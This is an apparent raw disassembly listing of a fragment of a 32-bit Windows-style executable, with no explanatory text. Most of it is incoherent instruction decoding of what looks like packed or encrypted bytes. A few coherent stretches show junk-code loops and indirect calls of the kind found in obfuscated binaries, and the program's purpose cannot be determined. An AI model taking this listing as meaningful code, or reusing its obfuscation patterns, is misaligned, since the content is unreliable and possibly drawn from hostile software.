  40d644:	xor    ecx,DWORD PTR [ebx-0x15c9ddbd]
  40d64a:	in     eax,0x9
  40d64c:	fcom   DWORD PTR [edx+edi*2-0x60]
  40d650:	lock cwde 
  40d652:	addr16 dec edx
  40d654:	mov    ebx,DWORD PTR [eax+0x44]
  40d657:	(bad)  
  40d659:	into   
  40d65a:	and    ebp,DWORD PTR [ebp-0x7dcca2ed]
  40d660:	cmp    eax,ebx
  40d662:	mov    cl,0x34
  40d664:	jmp    0xc89d8611
  40d669:	int    0x4a
  40d66b:	xor    eax,0x1ef82be9
  40d670:	out    0xac,al
  40d672:	push   edx
  40d673:	jb     0x40d61f
  40d675:	fisub  DWORD PTR [edx-0x773d8b58]
  40d67b:	fwait
  40d67c:	(bad)  
  40d67d:	int    0xb9
  40d67f:	ja     0x40d6d0
  40d681:	dec    eax
  40d682:	jae    0x40d6a6
  40d684:	shr    DWORD PTR [ecx-0x1e113eac],1
  40d68a:	push   ss
  40d68b:	scas   al,BYTE PTR es:[edi]
  40d68c:	in     al,0xf4
  40d68e:	inc    ebx
  40d68f:	out    dx,al
  40d690:	mov    ds:0xba16118a,al
  40d695:	pop    eax
  40d696:	fmul   DWORD PTR [ebx-0x49]
  40d699:	sub    eax,0x984e16c9
  40d69e:	or     BYTE PTR [ecx+ebp*2-0x41a3a3e5],dl
  40d6a5:	ficom  DWORD PTR [eax]
  40d6a7:	or     ecx,eax
  40d6a9:	jmp    0x4ee9:0x94d71709
  40d6b0:	ror    edi,cl
  40d6b2:	ja     0x40d69b
  40d6b4:	jne    0x40d681
  40d6b6:	mov    dl,0x67
  40d6b8:	scas   al,BYTE PTR es:[edi]
  40d6b9:	je     0x40d659
  40d6bb:	lea    esi,[ebx-0x38]
  40d6be:	into   
  40d6bf:	iret   
  40d6c0:	out    dx,al
  40d6c1:	in     al,0x3d
  40d6c3:	in     al,dx
  40d6c4:	inc    eax
  40d6c5:	pop    ecx
  40d6c6:	mov    ch,0xd3
  40d6c8:	mov    bh,0xb3
  40d6ca:	inc    esp
  40d6cb:	push   ebx
  40d6cc:	imul   edx,DWORD PTR [esi+0x6b25f0ba],0x30
  40d6d3:	jnp    0x40d720
  40d6d5:	lods   eax,DWORD PTR ds:[esi]
  40d6d6:	jno    0x40d667
  40d6d8:	sub    DWORD PTR [esp+edi*4-0x35],edx
  40d6dc:	push   ss
  40d6dd:	nop
  40d6de:	out    0x18,eax
  40d6e0:	jae    0x40d689
  40d6e2:	(bad)  
  40d6e3:	pop    eax
  40d6e4:	cmp    al,0x8a
  40d6e6:	xor    eax,0x21dda213
  40d6eb:	test   eax,0x25d2e566
  40d6f0:	xchg   ecx,eax
  40d6f1:	adc    DWORD PTR [ebp+0x369f056e],0x1f
  40d6f8:	ds (bad) 
  40d6fa:	mov    ecx,0x4573
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43431d,0x432cde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434311,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432cca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432cca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432cca,ecx
  40d749:	cmp    DWORD PTR ds:0x432cca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432cca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432b72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434286,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434286
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434286,ecx
  40d78a:	cmp    DWORD PTR ds:0x434286,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4327db
  40d79c:	push   0x43277d
  40d7a1:	call   DWORD PTR ds:0x4328f6
  40d7a7:	cmp    DWORD PTR ds:0x434286,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434286
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434286,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434286,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434296,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434296
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434296,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434296,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434296,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4328fa
  40d813:	cmp    DWORD PTR ds:0x434296,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434296
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434296,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432ce2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432604,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0xa1
  40d85b:	xor    bl,BYTE PTR [edx-0x37]
  40d85e:	push   edi
  40d85f:	mov    dh,BYTE PTR [eax+0x70]
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8b7
  40d867:	dec    ecx
  40d868:	test   BYTE PTR [edi+0x17b16848],0xae
  40d86f:	out    dx,eax
  40d870:	xor    DWORD PTR [ebp+0x7a],edx
  40d873:	data16 mov WORD PTR ds:0xd0313ace,ss
  40d87a:	mov    esp,edi
  40d87c:	xchg   ebx,eax
  40d87d:	std    
  40d87e:	and    ch,cl
  40d880:	jns    0x40d8de
  40d882:	imul   edx,DWORD PTR [esp+esi*2-0x3b],0x2
  40d887:	(bad)  
  40d888:	hlt    
  40d889:	test   al,0xae
  40d88b:	sub    eax,0xef6e9bef
  40d890:	mov    bh,0x23
  40d892:	push   esp
  40d893:	push   ecx
  40d894:	lods   eax,DWORD PTR ds:[esi]
  40d895:	(bad)  [ecx-0x18]
  40d898:	mov    al,ds:0x46915878
  40d89d:	mov    edi,0xff6b5ea0
  40d8a2:	aaa    
  40d8a3:	jl     0x40d849
  40d8a5:	fnstcw WORD PTR [ecx+eiz*1+0x3d]
  40d8a9:	sbb    DWORD PTR [ebp-0x15],ecx
  40d8ac:	jp     0x40d8e4
  40d8ae:	in     al,dx
  40d8af:	add    al,0x20
  40d8b1:	les    eax,FWORD PTR [esi]
  40d8b3:	pop    eax
  40d8b4:	sbb    eax,0x4469b92d
  40d8b9:	mov    esi,0x69f489cd
  40d8be:	sub    al,0xaf
  40d8c0:	mov    edi,0x59c5abed
  40d8c5:	outs   dx,DWORD PTR ds:[esi]
  40d8c6:	sahf   
  40d8c7:	sub    BYTE PTR [eax],0xe7
  40d8ca:	mov    ch,0xc5
  40d8cc:	in     al,0xc6
  40d8ce:	(bad)  
  40d8cf:	jae    0x40d8e5
  40d8d1:	xor    ebp,0xffffffd1
  40d8d4:	ror    esi,cl
  40d8d6:	outs   dx,DWORD PTR ds:[esi]
  40d8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8d9:	pop    eax
  40d8da:	icebp  
  40d8db:	pusha  
  40d8dc:	stos   BYTE PTR es:[edi],al
  40d8dd:	into   
  40d8de:	je     0x40d931
  40d8e0:	es mov eax,0x2031ea9e
  40d8e6:	mov    ecx,0xe6af3da0
  40d8eb:	shl    esp,1
  40d8ed:	xor    edi,DWORD PTR ds:[esi]
  40d8f0:	add    edx,0xe64db7ed
  40d8f6:	dec    ecx
  40d8f7:	xchg   ebx,eax
  40d8f8:	stc    
  40d8f9:	rol    DWORD PTR [edx+eiz*8],0xc0
  40d8fd:	rcl    BYTE PTR [ebx+esi*2],1
  40d900:	mov    ecx,0xbe60f514
  40d905:	push   eax
  40d906:	aaa    
  40d907:	sub    BYTE PTR [eax-0x54],ch
  40d90a:	mov    eax,ds:0x94e77a75
  40d90f:	cwde   
  40d910:	ds jne 0x40d8cd
  40d913:	add    al,0xea
  40d915:	sbb    DWORD PTR [ebx],esp
  40d917:	js     0x40d8bd
  40d919:	in     eax,0x57
  40d91b:	call   0xc8b73703
  40d920:	mov    ecx,0x231c37e3
  40d925:	aad    0xd1
  40d927:	push   ebx
  40d928:	jbe    0x40d953
  40d92a:	iret   
  40d92b:	fild   DWORD PTR [ebx]
  40d92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d92e:	into   
  40d92f:	pop    esp
  40d930:	dec    ecx
  40d931:	and    ch,al
  40d933:	gs je  0x40d8ce
  40d936:	or     al,0xf4
  40d938:	push   esi
  40d939:	inc    esi
  40d93a:	pop    ss
  40d93b:	dec    esi
  40d93c:	and    DWORD PTR [ebx+0x6e],0x7a
  40d940:	bound  ecx,QWORD PTR [ecx-0x21]
  40d943:	push   es
  40d944:	(bad)  
  40d945:	pushf  
  40d946:	call   0x9aff6034
  40d94b:	ja     0x40d98d
  40d94d:	ror    eax,0xe2
  40d950:	pushf  
  40d951:	xchg   edx,eax
  40d952:	adc    al,0xa1
  40d954:	cld    
  40d955:	xlat   BYTE PTR ds:[ebx]
  40d956:	rcl    BYTE PTR [ebx-0x5519b5aa],0x86
  40d95d:	shl    bh,1
  40d95f:	addr16 push 0x7dceafb1
  40d965:	push   edx
  40d966:	pushf  
  40d967:	xchg   edi,eax
  40d968:	dec    eax
  40d969:	(bad)  
  40d96a:	(bad)  
  40d96b:	ins    WORD PTR es:[edi],dx
  40d96d:	loope  0x40d9a8
  40d96f:	inc    esp
  40d970:	js     0x40d905
  40d972:	jns    0x40d9bb
  40d974:	or     esp,edi
  40d976:	xchg   ecx,eax
  40d977:	(bad)  
  40d978:	lahf   
  40d979:	sbb    al,BYTE PTR [eax+0x33]
  40d97c:	xor    BYTE PTR [ebx+0x66668fb1],0x14
  40d983:	loopne 0x40da02
  40d985:	or     ah,BYTE PTR [edx]
  40d987:	sbb    eax,0x14f5cdca
  40d98c:	in     eax,0x25
  40d98e:	into   
  40d98f:	or     al,0x82
  40d991:	es xor edx,0x14
  40d995:	or     eax,0x6d391644
  40d99a:	dec    edx
  40d99b:	xchg   ecx,eax
  40d99c:	push   ds
  40d99d:	clc    
  40d99e:	jae    0x40d9ef
  40d9a0:	aad    0xc
  40d9a2:	xor    bh,al
  40d9a4:	xchg   esp,eax
  40d9a5:	mov    ecx,DWORD PTR [ecx-0x26]
  40d9a8:	dec    edi
  40d9a9:	je     0x40d9bf
  40d9ab:	push   cs
  40d9ac:	mov    DWORD PTR [edi*4-0x40573014],edx
  40d9b3:	jl     0x40da29
  40d9b5:	hlt    
  40d9b6:	popa   
  40d9b7:	jmp    FWORD PTR [ebx]
  40d9b9:	add    BYTE PTR [ebx],ah
  40d9bb:	jb     0x40d95c
  40d9bd:	in     al,0x72
  40d9bf:	lock out dx,eax
  40d9c1:	pop    es
  40d9c2:	fiadd  DWORD PTR [edi]
  40d9c4:	mov    ch,0x14
  40d9c6:	lods   eax,DWORD PTR ds:[esi]
  40d9c7:	xchg   ecx,eax
  40d9c8:	xor    edi,DWORD PTR [ebx+eax*8-0x7c0580d8]
  40d9cf:	and    ebx,DWORD PTR gs:[ecx+0x642ff6cd]
  40d9d6:	pop    ds
  40d9d7:	jae    0x40da3e
  40d9d9:	add    al,0x4d
  40d9db:	mov    dh,0x53
  40d9dd:	lods   eax,DWORD PTR ss:[esi]
  40d9df:	xor    esi,DWORD PTR [eax]
  40d9e1:	adc    al,0xfb
  40d9e3:	xchg   ebx,eax
  40d9e4:	out    0x19,eax
  40d9e6:	xchg   edi,eax
  40d9e7:	test   al,0x44
  40d9e9:	or     ah,dl
  40d9eb:	or     ah,dl
  40d9ed:	retf   0xf56f
  40d9f0:	adc    BYTE PTR [ebp+0x59364ace],bh
  40d9f6:	jmp    0xf14a5c23
  40d9fb:	push   0xffffff9d
  40d9fd:	ss jae 0x40d9cb
  40da00:	push   0x2c
  40da02:	push   esp
  40da03:	xchg   ebx,eax
  40da04:	(bad)  
  40da05:	les    ebx,FWORD PTR [ebp-0x62d613c1]
  40da0b:	data16 cmp al,0x63
  40da0e:	les    ebx,FWORD PTR fs:[ebx+0x46]
  40da12:	jmp    0x40d9e2
  40da14:	imul   eax,DWORD PTR [edi-0x3f],0xffffffb7
  40da18:	cmp    cl,BYTE PTR [eax]
  40da1a:	fsub   DWORD PTR [esi]
  40da1c:	les    eax,FWORD PTR [esi]
  40da1e:	mov    ecx,0xe21e4040
  40da23:	xchg   ebp,eax
  40da24:	add    bp,WORD PTR [edi+0x3201890e]
  40da2b:	test   BYTE PTR [eax],cl
  40da2d:	sub    ch,BYTE PTR [eax+0x41]
  40da30:	mov    ss,esi
  40da32:	call   0x9a733a2a
  40da37:	gs sub al,ah
  40da3a:	bound  ecx,QWORD PTR [eax-0x4aebc12e]
  40da40:	sub    esp,DWORD PTR [ecx+edi*4]
  40da43:	sub    eax,0x4655b8fd
  40da48:	fs jne 0x40da2e
  40da4b:	adc    eax,0xb1ea2632
  40da50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da51:	int3   
  40da52:	sbb    DWORD PTR [eax-0x1871387f],0x5e
  40da59:	sub    DWORD PTR [eax-0x42],0x673260c2
  40da60:	fwait
  40da61:	(bad)  
  40da62:	jecxz  0x40daca
  40da64:	adc    eax,0x60dce30f
  40da69:	popa   
  40da6a:	cmp    BYTE PTR [ebx+0x2517554d],dh
  40da70:	sbb    edx,DWORD PTR [ebx+0xb]
  40da73:	cmp    eax,0xbe06f9a8
  40da78:	enter  0xd5b8,0x8f
  40da7c:	and    eax,0x66be5f01
  40da81:	mov    edx,0xbb19311f
  40da86:	pop    ebp
  40da87:	adc    dl,BYTE PTR [esi+0x45314b8c]
  40da8d:	inc    ebp
  40da8e:	xchg   ebp,eax
  40da8f:	retf   
  40da90:	inc    ebp
  40da91:	popa   
  40da92:	and    ah,BYTE PTR [eax-0x61415759]
  40da98:	cld    
  40da99:	sbb    BYTE PTR [ebp+0x20],dl
  40da9c:	rol    BYTE PTR [ecx],cl
  40da9e:	adc    ch,BYTE PTR [eax]
  40daa0:	pop    ss
  40daa1:	xchg   esi,eax
  40daa2:	les    edx,FWORD PTR [ecx]
  40daa4:	dec    ecx
  40daa5:	data16 sub BYTE PTR ds:0xe979d1c8,bh
  40daac:	div    bl
  40daae:	adc    eax,0xc73cc280
  40dab3:	scas   al,BYTE PTR es:[edi]
  40dab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab5:	jmp    0x9b3a218c
  40daba:	pusha  
  40dabb:	pop    edx
  40dabc:	cdq    
  40dabd:	out    0x7a,al
  40dabf:	sub    BYTE PTR [edx+edx*1+0x170c4c2e],ah
  40dac6:	in     eax,dx
  40dac7:	cs add esp,eax
  40daca:	sbb    esi,ebp
  40dacc:	in     al,0xbe
  40dace:	cli    
  40dacf:	sub    cl,BYTE PTR [ecx]
  40dad1:	inc    ebx
  40dad2:	cs xchg esi,eax
  40dad4:	mov    al,ds:0xe33bde2
  40dad9:	imul   edx,DWORD PTR [eax],0x3e
  40dadc:	loop   0x40db4b
  40dade:	sahf   
  40dadf:	dec    esp
  40dae0:	inc    edx
  40dae1:	sbb    BYTE PTR [ecx+0x6481ed83],ch
  40dae7:	mov    edx,0xf007b829
  40daec:	loopne 0x40daa4
  40daee:	pop    ss
  40daef:	inc    ecx
  40daf0:	stos   DWORD PTR es:[edi],eax
  40daf1:	stc    
  40daf2:	push   esp
  40daf3:	std    
  40daf4:	and    BYTE PTR [bp+di],dh
  40daf7:	pop    es
  40daf8:	out    0x2f,al
  40dafa:	cmp    eax,0x711fb5a
  40daff:	into   
  40db00:	aaa    
  40db01:	jno    0x40db70
  40db03:	dec    edx
  40db04:	xor    DWORD PTR [ecx+edi*1-0x42f64f3e],esi
  40db0b:	pusha  
  40db0c:	iret   
  40db0d:	repz imul ebx,DWORD PTR [ebp+0x4cbe2281],0x3dade578
  40db18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db19:	std    
  40db1a:	sahf   
  40db1b:	in     eax,dx
  40db1c:	scas   al,BYTE PTR es:[edi]
  40db1d:	mov    eax,ds:0xa47f55c8
  40db22:	outs   dx,BYTE PTR ds:[esi]
  40db23:	jge    0x40db5f
  40db25:	mov    ds:0x21180c3f,eax
  40db2a:	add    BYTE PTR [edi],al
  40db2c:	int3   
  40db2d:	xchg   edx,eax
  40db2e:	adc    bh,BYTE PTR [ecx-0x70]
  40db31:	add    eax,DWORD PTR [ebx-0x28]
  40db34:	xchg   edx,eax
  40db35:	test   al,0xd
  40db37:	mov    eax,0x6e83fff
  40db3c:	call   0x41f8b000
  40db41:	hlt    
  40db42:	out    dx,al
  40db43:	dec    ecx
  40db44:	xchg   edx,eax
  40db45:	sbb    eax,0x17933f8f
  40db4a:	jl     0x40dbaa
  40db4c:	or     al,0x6e
  40db4e:	push   eax
  40db4f:	aam    0xeb
  40db51:	fdiv   QWORD PTR [ecx-0x78]
  40db54:	(bad)  
  40db55:	fiadd  WORD PTR [ecx-0x4]
  40db58:	or     eax,0x717386ce
  40db5d:	jb     0x40db41
  40db5f:	bound  bx,DWORD PTR [ecx]
  40db62:	ret    0x8e1c
  40db65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db66:	es adc bl,bh
  40db69:	or     esp,ebp
  40db6b:	and    DWORD PTR [ecx-0x49],0xfa2bbbf5
  40db72:	test   al,0xd8
  40db74:	push   ebx
  40db75:	(bad)  
  40db77:	xchg   BYTE PTR [edi+0x61],ah
  40db7a:	cdq    
  40db7b:	pop    esp
  40db7c:	sbb    BYTE PTR [edx],dl
  40db7e:	dec    ebx
  40db7f:	test   ch,ah
  40db81:	lods   al,BYTE PTR ds:[esi]
  40db82:	xchg   ah,ah
  40db84:	(bad)  
  40db86:	and    edx,ecx
  40db88:	sti    
  40db89:	icebp  
  40db8a:	fmul   QWORD PTR [ebp+0x2d]
  40db8d:	gs shl ecx,cl
  40db90:	retf   
  40db91:	sbb    eax,DWORD PTR [esi+0x2b79b6f1]
  40db97:	inc    ebp
  40db98:	(bad)  
  40db99:	pop    ebp
  40db9a:	sub    DWORD PTR [ebx+0x39],eax
  40db9d:	ror    bh,cl
  40db9f:	mov    eax,0xc4b53e19
  40dba4:	bound  esp,QWORD PTR [ecx-0x52f066a8]
  40dbaa:	jecxz  0x40db47
  40dbac:	mov    esp,0xec061c1b
  40dbb1:	inc    edx
  40dbb2:	(bad)  
  40dbb3:	lock ret 
  40dbb5:	mov    ch,0x18
  40dbb7:	sahf   
  40dbb8:	inc    edx
  40dbb9:	jne    0x40dc09
  40dbbb:	cmp    esp,edx
  40dbbd:	inc    esi
  40dbbe:	aas    
  40dbbf:	mov    cs,WORD PTR [esi+0x5e1033ac]
  40dbc5:	aaa    
  40dbc6:	cmp    ah,BYTE PTR [edi-0x7e2e7b05]
  40dbcc:	sbb    eax,0xb808279a
  40dbd1:	adc    bh,BYTE PTR [ebx-0x6e]
  40dbd4:	out    dx,eax
  40dbd5:	dec    esp
  40dbd6:	mov    ebp,0x447390e
  40dbdb:	cs int 0x48
  40dbde:	inc    eax
  40dbdf:	lds    ebx,FWORD PTR [ebx+0x5f5c6f67]
  40dbe5:	mov    ds:0x7b2f0ce,eax
  40dbea:	xchg   esi,eax
  40dbeb:	fnstenv [ebx+0x18]
  40dbee:	push   ds
  40dbef:	leave  
  40dbf0:	cld    
  40dbf1:	stos   BYTE PTR es:[edi],al
  40dbf2:	sub    dl,BYTE PTR [edx+0x6e9317f9]
  40dbf8:	jle    0x40dbdb
  40dbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfb:	lods   al,BYTE PTR ds:[esi]
  40dbfc:	or     edi,DWORD PTR [edi-0x11]
  40dbff:	into   
  40dc00:	mov    bl,0xbd
  40dc02:	bound  esp,QWORD PTR [edx-0x22]
  40dc05:	fnstcw WORD PTR [ebx+0x6c93ea7a]
  40dc0b:	pushf  
  40dc0c:	and    eax,0x9c32a8d
  40dc11:	ds into 
  40dc13:	jecxz  0x40dc13
  40dc15:	sbb    al,0xfe
  40dc17:	jp     0x40dba5
  40dc19:	mov    ds:0x2bc3f510,eax
  40dc1e:	setp   BYTE PTR cs:[ebx+0x12]
  40dc23:	ret    0x9ead
  40dc26:	jg     0x40dbe8
  40dc28:	inc    eax
  40dc29:	lods   eax,DWORD PTR ds:[esi]
  40dc2a:	xor    edx,DWORD PTR [ecx+0x37]
  40dc2d:	(bad)  [ecx]
  40dc2f:	int3   
  40dc30:	loop   0x40dbeb
  40dc32:	dec    ebp
  40dc33:	inc    edi
  40dc34:	mov    eax,0xa87cdd10
  40dc39:	pop    edx
  40dc3a:	xchg   ecx,eax
  40dc3b:	jns    0x40dbd9
  40dc3d:	mov    DWORD PTR [ebp-0x8],esi
  40dc40:	mov    ecx,DWORD PTR ds:0x43429a
  40dc46:	and    DWORD PTR ds:0x432cc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4325f8,0x434311
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dcd1
  40dc6d:	fiadd  WORD PTR [esi+0x7096a01d]
  40dc73:	jo     0x40dcbe
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dc78
  40dc79:	(bad)  
  40dc7a:	cld    
  40dc7b:	(bad)  
  40dc7c:	mov    ebx,0x59bc7c25
  40dc81:	push   0xffffffc8
  40dc83:	mov    ebx,0xa66ac356
  40dc88:	sar    DWORD PTR [eax-0xd],1
  40dc8b:	cmc    
  40dc8c:	or     eax,0xa1c2ab96
  40dc91:	pop    eax
  40dc92:	or     al,0x6
  40dc94:	fidivr DWORD PTR [ecx]
  40dc96:	inc    edi
  40dc97:	or     BYTE PTR [ecx+0x60d73d57],al
  40dc9d:	sbb    al,ch
  40dc9f:	ror    ebp,cl
  40dca1:	sar    DWORD PTR [edi-0x63],0xe3
  40dca5:	add    BYTE PTR [eax-0x15],dh
  40dca8:	in     al,0x9b
  40dcaa:	sub    DWORD PTR [edi-0x12],eax
  40dcad:	push   cs
  40dcae:	fcmovb st,st(4)
  40dcb0:	ror    cl,0x6b
  40dcb3:	sbb    BYTE PTR [esi-0x468d9064],ah
  40dcb9:	pushf  
  40dcba:	js     0x40dc6d
  40dcbc:	jle    0x40dc95
  40dcbe:	sar    BYTE PTR [edi-0x52831c00],1
  40dcc4:	mov    BYTE PTR [ebx+0xb048e67],ch
  40dcca:	rcr    DWORD PTR [ecx+0x4b5fa351],cl
  40dcd0:	and    al,0xd4
  40dcd2:	cmp    ebx,DWORD PTR [edx+0x6263af9c]
  40dcd8:	jg     0x40dd16
  40dcda:	xchg   edi,eax
  40dcdb:	mov    ah,0x3d
  40dcdd:	pop    dx
  40dcdf:	mov    ds:0xbf64277e,eax
  40dce4:	imul   ebx,ebp,0x6364b077
  40dcea:	or     dh,BYTE PTR [edx+edi*4-0x45b55d23]
  40dcf1:	loope  0x40dd02
  40dcf3:	and    bl,BYTE PTR [ebp-0x40]
  40dcf6:	jb     0x40dca0
  40dcf8:	cmp    BYTE PTR [ecx+0x70],bl
  40dcfb:	xor    al,0xf7
  40dcfd:	push   edi
  40dcfe:	mov    ebp,ecx
  40dd00:	fdivrp st(0),st
  40dd02:	adc    al,BYTE PTR [edx+0xd]
  40dd05:	pop    esi
  40dd06:	xor    al,0x78
  40dd08:	popa   
  40dd09:	inc    eax
  40dd0a:	in     eax,0xd5
  40dd0c:	mov    esp,0x746db69b
  40dd11:	xchg   esi,eax
  40dd12:	sbb    al,0x61
  40dd14:	xor    bl,BYTE PTR [ebp-0x4732dbc6]
  40dd1a:	or     al,0x8f
  40dd1c:	cs xchg ebp,eax
  40dd1e:	xor    eax,0xcccfc976
  40dd23:	dec    ebx
  40dd24:	mov    al,ds:0x35c7da18
  40dd29:	mov    al,ds:0x3064912c
  40dd2e:	mov    ebp,0xf5b19ae3
  40dd33:	mov    ds:0xd2576773,eax
  40dd38:	dec    ecx
  40dd39:	jns    0x40dd69
  40dd3b:	xor    dh,BYTE PTR [edx-0x6e]
  40dd3e:	js     0x40dd43
  40dd40:	add    DWORD PTR [edi+0x36],esi
  40dd43:	mov    ecx,DWORD PTR [esi+0x57]
  40dd46:	xchg   ebp,eax
  40dd47:	in     al,dx
  40dd48:	mov    BYTE PTR [esp+ebp*8],bl
  40dd4b:	sub    edi,DWORD PTR [ebx]
  40dd4d:	out    0x57,eax
  40dd4f:	retf   0x2dd2
  40dd52:	and    eax,0xa5db5485
  40dd57:	gs lahf 
  40dd59:	lahf   
  40dd5a:	add    eax,0x9bcbf836
  40dd5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd60:	mov    ds:0x66499fe1,eax
  40dd65:	das    
  40dd66:	sub    dl,BYTE PTR [eax]
  40dd68:	inc    edx
  40dd69:	cmp    dl,BYTE PTR [esi+0x4a74387d]
  40dd6f:	call   0x9f8c64c7
  40dd74:	sti    
  40dd75:	fs nop
  40dd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd78:	sahf   
  40dd79:	fistp  DWORD PTR [ebp+eax*8-0x7d]
  40dd7d:	(bad)  
  40dd7f:	nop
  40dd80:	out    dx,al
  40dd81:	mov    ebx,DWORD PTR [esi+0x7c]
  40dd84:	adc    al,0xed
  40dd86:	pop    ds
  40dd87:	daa    
  40dd88:	cmp    edi,DWORD PTR [ebx-0x5f9dad31]
  40dd8e:	test   BYTE PTR [ebx+ecx*1-0x18],cl
  40dd92:	cdq    
  40dd93:	mov    bl,0xe
  40dd95:	sbb    DWORD PTR [ecx+0x62],ebp
  40dd98:	sti    
  40dd99:	int3   
  40dd9a:	mov    WORD PTR [ebp+eax*8+0x3a],ds
  40dd9e:	and    eax,edx
  40dda0:	add    al,0x20
  40dda2:	daa    
  40dda3:	jmp    0xf3aa:0x2739927b
  40ddaa:	pop    ebx
  40ddab:	ss das 
  40ddad:	mov    ecx,0x5c089d36
  40ddb2:	adc    BYTE PTR [edx+0x642dccf9],0x88
  40ddb9:	(bad)  
  40ddba:	stc    
  40ddbb:	fsubr  QWORD PTR [ebp+0x23b55fee]
  40ddc1:	aad    0xc2
  40ddc3:	xor    DWORD PTR [ebp+0x74],0x74
  40ddc7:	imul   DWORD PTR [ecx+0x39b37c1]
  40ddcd:	int3   
  40ddce:	adc    cl,BYTE PTR [ecx+0x4a]
  40ddd1:	mov    ds:0x8ee13f94,al
  40ddd6:	fdiv   QWORD PTR [edi-0x7364a264]
  40dddc:	enter  0x35a8,0x42
  40dde0:	pop    ebp
  40dde1:	pop    ecx
  40dde2:	sbb    eax,0xb9e3e88f
  40dde7:	scas   al,BYTE PTR es:[edi]
  40dde8:	pop    eax
  40dde9:	mov    dh,0xaf
  40ddeb:	xchg   edx,eax
  40ddec:	sub    DWORD PTR [eax],esi
  40ddee:	aas    
  40ddef:	stc    
  40ddf0:	push   0x4d
  40ddf2:	lods   al,BYTE PTR ds:[esi]
  40ddf3:	outs   dx,BYTE PTR ds:[esi]
  40ddf4:	scas   eax,DWORD PTR es:[edi]
  40ddf5:	and    dl,BYTE PTR ds:0xd73d1043
  40ddfc:	int3   
  40ddfd:	jp     0x40ddf4
  40ddff:	mov    bl,al
  40de01:	add    al,0xc5
  40de03:	adc    eax,DWORD PTR [edi-0x67]
  40de06:	cli    
  40de07:	fsubr  QWORD PTR [ebp+edi*2-0x79e75381]
  40de0e:	xchg   BYTE PTR ds:[esi],dh
  40de11:	data16 mov al,0x38
  40de14:	jne    0x40ddfb
  40de16:	push   esp
  40de17:	jo     0x40ddbe
  40de19:	push   ecx
  40de1a:	loope  0x40de38
  40de1c:	test   BYTE PTR [edi-0x1439293e],cl
  40de22:	pusha  
  40de23:	nop
  40de24:	dec    ebp
  40de25:	cdq    
  40de26:	neg    cl
  40de28:	pop    es
  40de29:	jo     0x40ddec
  40de2b:	add    DWORD PTR [esi+ebp*8+0x40],edi
  40de2f:	repnz cmp ecx,DWORD PTR [edi+0x1d]
  40de33:	loope  0x40ddcf
  40de35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de36:	and    DWORD PTR [ebx],0x5406f5d6
  40de3c:	int    0xe2
  40de3e:	ror    BYTE PTR [esp+esi*1+0x36],1
  40de42:	es and edx,ebx
  40de45:	loop   0x40ddf0
  40de47:	push   ds
  40de48:	adc    eax,0x51c5862e
  40de4d:	add    eax,0xaf16d09f
  40de52:	cmc    
  40de53:	hlt    
  40de54:	arpl   cx,bp
  40de56:	test   eax,0xee36c755
  40de5b:	mov    esi,0x37d0d092
  40de60:	xor    dl,ah
  40de62:	ret    
  40de63:	daa    
  40de64:	add    al,0xe5
